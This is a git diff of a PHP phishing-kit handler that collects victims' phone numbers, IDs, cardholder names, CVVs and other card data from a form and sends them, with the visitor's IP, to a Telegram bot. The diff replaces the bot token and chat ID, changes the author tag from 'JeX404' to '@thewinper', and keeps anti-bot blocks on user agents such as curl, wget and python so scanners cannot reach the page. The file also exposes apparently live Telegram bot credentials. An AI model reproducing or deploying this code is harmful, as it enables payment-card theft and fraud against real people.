@@ -8,9 +8,17 @@ include('prevents/anti7.php');
 include('prevents/anti3.php');
 
 // Anti-Bot Protection
-function blockSuspiciousUserAgent() {
+function blockSuspiciousUserAgent()
+{
     $botAgents = [
-        'curl', 'wget', 'bot', 'crawler', 'spider', 'http', 'python', 'java'
+        'curl',
+        'wget',
+        'bot',
+        'crawler',
+        'spider',
+        'http',
+        'python',
+        'java'
     ];
     $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
     foreach ($botAgents as $bot) {
@@ -21,7 +29,8 @@ function blockSuspiciousUserAgent() {
     }
 }
 
-function blockSuspiciousIPs() {
+function blockSuspiciousIPs()
+{
     $blockedIPs = [
         '192.168.1.1', // Replace with actual IPs to block
         '123.456.789.0',
@@ -36,8 +45,8 @@ function blockSuspiciousIPs() {
 blockSuspiciousUserAgent();
 blockSuspiciousIPs();
 // Telegram Bot Configuration
-$botToken = "7242857412:AAHCG6DxmgZJv-NZ3uqTCDqpw56Ql8mKnlY";
-$chatId = "-1002570216135";
+$botToken = "7274962782:AAGi2HZlpm4EGxeoPWrLURWIApxrQls08yw";
+$chatId = "-4770377680";
 
 // Collect Form Data
 $phone = $_POST['phone'];
@@ -52,7 +61,7 @@ $cvv = $_POST['cvv'];
 $ip_address = $_SERVER['REMOTE_ADDR'];
 
 // Format the Message
-$message = "🦎 *By JeX404* 🦎\n\n";
+$message = "🦎 *By @thewinper* 🦎\n\n";
 $message .= "📱 *Phone:* $phone\n";
 $message .= "🆔 *ID:* $id\n";
 $message .= "👤 *Cardholder Name:* $card_name\n";
@@ -86,4 +95,3 @@ if ($response) {
 } else {
     echo "Error: Unable to send message to Telegram.";
 }
-?>
